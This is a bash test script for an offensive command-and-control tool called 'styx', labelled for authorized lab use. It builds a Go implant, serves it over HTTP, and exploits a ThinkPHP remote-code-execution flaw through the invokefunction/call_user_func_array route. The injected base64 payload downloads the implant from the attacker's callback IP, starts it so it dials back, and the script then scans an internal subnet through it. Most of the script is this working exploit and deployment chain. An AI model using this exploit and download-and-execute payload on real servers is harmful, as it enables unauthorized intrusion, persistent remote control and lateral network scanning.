#!/usr/bin/env bash
# Lab e2e for start_scan (hybrid discover + progress). Authorized lab only.
#
# Usage:
#   export STYX_SECRET=ctfsecret
#   export STYX_CALLBACK=192.168.230.57   # attacker IP agents dial back to
#   ./scripts/lab-scan-e2e.sh
#
# Steps:
#   1) Build linux agent + local controller
#   2) Stage agent over HTTP :18080
#   3) RCE deploy to edge (default 10.7.11.116 ThinkPHP)
#   4) Run lab_scan_smoke on :19139 (does not steal MCP :19137)
#   5) Print results / soft assertions inside smoke
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SECRET="${STYX_SECRET:-ctfsecret}"
CALLBACK="${STYX_CALLBACK:-192.168.230.57}"
EDGE="${STYX_EDGE_URL:-http://10.7.11.116/}"
LISTEN_PORT="${STYX_LAB_LISTEN_PORT:-19139}"
STAGE_PORT="${STYX_STAGE_PORT:-18080}"
TARGETS="${STYX_SCAN_TARGETS:-172.16.23.0/24}"

BIN_LINUX="$ROOT/release/linux-amd64/agent"
OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
ARCH="$(uname -m | sed 's/x86_64/amd64/;s/aarch64/arm64/')"
BIN_CTRL="$ROOT/release/${OS}-${ARCH}/controller"

echo "[*] build"
cd "$ROOT"
make build >/dev/null
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o "$BIN_LINUX" ./cmd/agent
echo "    agent=$(stat -f%z "$BIN_LINUX" 2>/dev/null || stat -c%s "$BIN_LINUX")"

# free ports
for port in "$LISTEN_PORT" "$STAGE_PORT"; do
  if command -v lsof >/dev/null 2>&1; then
    for p in $(lsof -nP -iTCP:"$port" -sTCP:LISTEN -t 2>/dev/null || true); do
      echo "[*] free :$port pid=$p"; kill -9 "$p" 2>/dev/null || true
    done
  fi
done
sleep 0.3

# stage
STAGE=$(mktemp -d /tmp/styx-stage.XXXX)
cp "$BIN_LINUX" "$STAGE/agent"
python3 -c "
import http.server,socketserver,os
os.chdir('$STAGE')
socketserver.TCPServer.allow_reuse_address=True
with socketserver.TCPServer(('0.0.0.0', int('$STAGE_PORT')), http.server.SimpleHTTPRequestHandler) as h:
    h.serve_forever()
" >/tmp/styx-stage-http.log 2>&1 &
STAGE_PID=$!
trap 'kill -9 $STAGE_PID 2>/dev/null || true; kill -9 $SMOKE_PID 2>/dev/null || true' EXIT
sleep 0.4
curl -sS -m 5 -o /dev/null -w "[*] stage http=%{http_code} size=%{size_download}\n" "http://127.0.0.1:${STAGE_PORT}/agent"

# start smoke (waits for agent)
export STYX_SECRET="$SECRET"
export STYX_LISTEN="0.0.0.0:${LISTEN_PORT}"
export STYX_SCAN_TARGETS="$TARGETS"
export STYX_SCAN_MODE="${STYX_SCAN_MODE:-fast}"
export STYX_SCAN_DISCOVER="${STYX_SCAN_DISCOVER:-1}"
export STYX_SCAN_METHOD="${STYX_SCAN_METHOD:-auto}"
export STYX_SCAN_FP="${STYX_SCAN_FP:-1}"

echo "[*] start lab_scan_smoke on :${LISTEN_PORT}"
go run "$ROOT/scripts/lab_scan_smoke.go" >/tmp/lab-scan-e2e.out 2>&1 &
SMOKE_PID=$!

# wait smoke listening
for i in $(seq 1 40); do
  if lsof -nP -iTCP:"$LISTEN_PORT" -sTCP:LISTEN >/dev/null 2>&1; then break; fi
  sleep 0.2
done

# deploy agent via ThinkPHP RCE (base64 to avoid shell metachar issues)
PAYLOAD=$(printf '%s' "rm -f /tmp/s-agent-lab; curl -fsSL -m 90 -o /tmp/s-agent-lab http://${CALLBACK}:${STAGE_PORT}/agent; chmod +x /tmp/s-agent-lab; kill \$(ps -ef | grep s-agent-lab | grep -v grep | awk '{print \$2}') 2>/dev/null; setsid /tmp/s-agent-lab -s ${SECRET} -c ${CALLBACK}:${LISTEN_PORT} </dev/null >/tmp/s-agent-lab.log 2>&1 & echo UP; ls -la /tmp/s-agent-lab" | base64 | tr -d '\n')
echo "[*] RCE deploy agent -> ${CALLBACK}:${LISTEN_PORT}"
curl -sS -m 120 -G "$EDGE" \
  --data-urlencode 's=home/\think\app/invokefunction' \
  --data-urlencode 'function=call_user_func_array' \
  --data-urlencode 'vars[0]=system' \
  --data-urlencode "vars[1][]=echo ${PAYLOAD}|base64 -d|sh" | head -c 400
echo

echo "[*] waiting for smoke (log: /tmp/lab-scan-e2e.out)..."
wait "$SMOKE_PID" || true
echo "===== lab-scan-e2e.out ====="
cat /tmp/lab-scan-e2e.out

# hard fail if smoke did not complete
if ! grep -q "SCAN RESULT\|PASS hybrid" /tmp/lab-scan-e2e.out; then
  echo "[!] FAIL: smoke did not produce result"
  exit 1
fi
if grep -q "FAIL:" /tmp/lab-scan-e2e.out; then
  echo "[!] FAIL markers in output"
  exit 1
fi
echo "[*] e2e ok"
